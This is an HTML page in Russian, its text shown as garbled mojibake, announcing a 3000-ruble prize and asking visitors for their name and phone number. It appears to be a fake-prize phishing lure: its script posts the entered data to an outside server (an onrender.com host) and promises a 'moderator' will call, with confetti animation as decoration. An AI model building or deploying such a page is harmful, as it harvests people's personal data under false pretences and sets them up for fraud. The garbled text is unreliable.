<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>–í—ã –≤—ã–∏–≥—Ä–∞–ª–∏ –ø—Ä–∏–∑!</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: sans-serif;
      background: #fff8f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
    }
    .container {
      text-align: center;
      background: white;
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 0 20px rgba(0,0,0,0.2);
      z-index: 1;
      position: relative;
    }
    input {
      display: block;
      margin: 10px auto;
      padding: 10px;
      width: 90%;
      border: 1px solid #ccc;
      border-radius: 10px;
      font-size: 16px;
    }
    button {
      background: #4caf50;
      color: white;
      border: none;
      padding: 12px 20px;
      font-size: 16px;
      border-radius: 10px;
      cursor: pointer;
    }
    button:hover {
      background: #45a049;
    }
    #message {
      margin-top: 15px;
      font-weight: bold;
    }
    canvas {
      position: fixed;
      top: 0;
      left: 0;
      pointer-events: none;
      z-index: 0;
    }
  </style>
</head>
<body>
  <canvas id="confetti"></canvas>

  <div class="container">
    <h1>üéâ –ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º! –í—ã –≤—ã–∏–≥—Ä–∞–ª–∏ 3000 ‚ÇΩ</h1>
    <p>–ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –ø—Ä–∏–∑, –≤–≤–µ–¥–∏—Ç–µ —Å–≤–æ—ë –∏–º—è –∏ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</p>
    <form id="prizeForm">
      <input type="text" name="name" placeholder="–í–∞—à–µ –∏–º—è" required />
      <input type="tel" name="phone" placeholder="+7XXXXXXXXXX" required />
      <button type="submit">–ü–æ–ª—É—á–∏—Ç—å –ø—Ä–∏–∑</button>
    </form>
    <div id="message"></div>
  </div>

  <script>
    document.getElementById('prizeForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const name = this.name.value.trim();
      const phone = this.phone.value.trim();
      const messageEl = document.getElementById('message');

      if (!/^\+7\d{10}$/.test(phone)) {
        messageEl.textContent = '–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä –≤ —Ñ–æ—Ä–º–∞—Ç–µ +7XXXXXXXXXX';
        messageEl.style.color = 'red';
        return;
      }

      fetch('https://proxylast-1.onrender.com', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name, phone })
      })
      .then(res => res.ok ? res.json() : Promise.reject())
      .then(() => {
        messageEl.textContent = '–°–ø–∞—Å–∏–±–æ! –° –≤–∞–º–∏ —Å–≤—è–∂–µ—Ç—Å—è –º–æ–¥–µ—Ä–∞—Ç–æ—Ä.';
        messageEl.style.color = 'green';
        this.reset();
      })
      .catch(() => {
        messageEl.textContent = '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.';
        messageEl.style.color = 'red';
      });
    });

    // –ö–æ–Ω—Ñ–µ—Ç—Ç–∏ üéâ
    const canvas = document.getElementById('confetti');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    let confetti = Array.from({ length: 300 }, () => ({
      x: Math.random() * canvas.width,
      y: Math.random() * canvas.height,
      r: Math.random() * 6 + 4,
      d: Math.random() * 20 + 10,
      color: `hsl(${Math.random() * 360}, 100%, 50%)`,
      tilt: Math.random() * 10 - 10
    }));

    function drawConfetti() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      confetti.forEach(c => {
        ctx.beginPath();
        ctx.lineWidth = c.r;
        ctx.strokeStyle = c.color;
        ctx.moveTo(c.x + c.tilt + c.r / 2, c.y);
        ctx.lineTo(c.x + c.tilt, c.y + c.tilt + c.d / 2);
        ctx.stroke();
      });
      updateConfetti();
      requestAnimationFrame(drawConfetti);
    }

    function updateConfetti() {
      confetti.forEach(c => {
        c.y += Math.cos(c.d) + 1 + c.r / 2;
        c.x += Math.sin(0.01);
        if (c.y > canvas.height) {
          c.y = -10;
          c.x = Math.random() * canvas.width;
        }
      });
    }

    if (canvas && ctx) drawConfetti();
  </script>
</body>
</html>
